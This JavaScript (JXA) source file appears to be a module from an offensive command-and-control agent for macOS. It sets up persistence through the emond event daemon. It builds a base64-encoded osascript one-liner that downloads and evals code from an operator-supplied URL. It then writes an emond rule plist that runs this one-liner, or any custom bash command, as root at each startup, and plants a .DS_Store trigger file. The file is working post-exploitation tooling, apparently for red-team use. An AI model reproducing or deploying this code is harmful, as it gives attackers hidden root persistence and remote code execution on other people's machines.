exports.persist_emond = function(task, command, params){
    try{
        //emond persistence from https://www.xorrior.com/emond-persistence/
        let config = JSON.parse(params);
        // read "/System/Library/LaunchDaemons/com.apple.emond.plist" for the "QueueDirectories" key (returns array)
        // create ".DS_Store" file there that's empty
        // create new plist in "/etc/emond.d/rules/"
        let rule_name = "update_files";
        if(config.hasOwnProperty('rule_name') && config['rule_name'] !== ""){rule_name = config['rule_name'];}
        let payload_type = "oneliner-jxa";
        if(config.hasOwnProperty('payload_type') && config['payload_type'] !== ""){payload_type = config['payload_type'];}
        if(payload_type === "oneliner-jxa"){
            if(config.hasOwnProperty('url') && config['url'] !== ""){var url = config['url'];}
            else{ return "URL is required for the oneliner-jxa payload_type"; }
            let internal_command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('" +
            url + "')),$.NSUTF8StringEncoding)))";
            // now we need to base64 encode our command
            var command_data = $(internal_command).dataUsingEncoding($.NSUTF16StringEncoding);
            var base64_command = command_data.base64EncodedStringWithOptions(0).js;
            var full_command = "echo \"" + base64_command + "\" | base64 -D | /usr/bin/osascript -l JavaScript &amp;";
        }
        else if(payload_type === "custom_bash-c"){
            if(config.hasOwnProperty('command') && config['command'] !== ""){var full_command = config['command'];}
            else{
            return {"user_output":"command is a required field for the custom_bash-c payload_type", "completed": true, "status": "error"};
            }
        }
        // get our new plist file_name
        if(config.hasOwnProperty('file_name') && config['file_name'] !== ""){ var file_name = config['file_name'];}
        else{ return {"user_output":"file name is required", "completed": true, "status": "error"}; }

        var plist_contents = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" +
    "<plist version=\"1.0\">\n" +
    "<array>\n" +
    "	<dict>\n" +
    "		<key>name</key>\n" +
    "		<string>" + rule_name + "</string>\n" +
    "		<key>enabled</key>\n" +
    "		<true/>\n" +
    "		<key>eventTypes</key>\n" +
    "		<array>\n" +
    "			<string>startup</string>\n" +
    "		</array>\n" +
    "		<key>actions</key>\n" +
    "		<array>\n" +
    "			<dict>\n" +
    "				<key>command</key>\n" +
    "				<string>/bin/sleep</string>\n" +
    "				<key>user</key>\n" +
    "				<string>root</string>\n" +
    "				<key>arguments</key>\n" +
    "				<array>\n" +
    "					<string>60</string>\n" +
    "				</array>\n" +
    "				<key>type</key>\n" +
    "				<string>RunCommand</string>\n" +
    "			</dict>\n" +
    "			<dict>\n" +
    "				<key>command</key>\n" +
    "				<string>/bin/bash</string>\n" +
    "				<key>user</key>\n" +
    "				<string>root</string>\n" +
    "				<key>arguments</key>\n" +
    "				<array>\n" +
    "					<string>-c</string>\n" +
    "					<string> " + full_command + "</string>\n" +
    "				</array>\n" +
    "				<key>type</key>\n" +
    "				<string>RunCommand</string>\n" +
    "			</dict>\n" +
    "		</array>\n" +
    "	</dict>\n" +
    "</array>\n" +
    "</plist>";
        // read the plist file and check the QueueDirectories field
        var prefs = ObjC.deepUnwrap($.NSMutableDictionary.alloc.initWithContentsOfFile($("/System/Library/LaunchDaemons/com.apple.emond.plist")));
        //console.log(JSON.stringify(prefs));
        var queueDirectories = prefs['QueueDirectories'];
        if(queueDirectories !== undefined && queueDirectories.length > 0){
            var queueDirectoryPath = queueDirectories[0];
            write_data_to_file(" ", queueDirectoryPath + "/.DS_Store");
            // now that we have a file in our queueDirectory, we need to write out our plist
            write_data_to_file(plist_contents, "/etc/emond.d/rules/" + file_name);

            var user_output = "Created " + queueDirectoryPath + "/.DS_Store and /etc/emond.d/rules/" + file_name + " with contents: \n" + plist_contents;

            // announce our created artifacts and user output
            return {'user_output': user_output, 'artifacts': [{'base_artifact': 'File Create', 'artifact': queueDirectoryPath + "/.DS_Store"}, {'base_artifact': 'File Create', 'artifact': '/etc/emond.d/rules/' + file_name}], "completed": true};
          }
        else{
            return {"user_output":"QueueDirectories array is either not there or 0 in length", "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
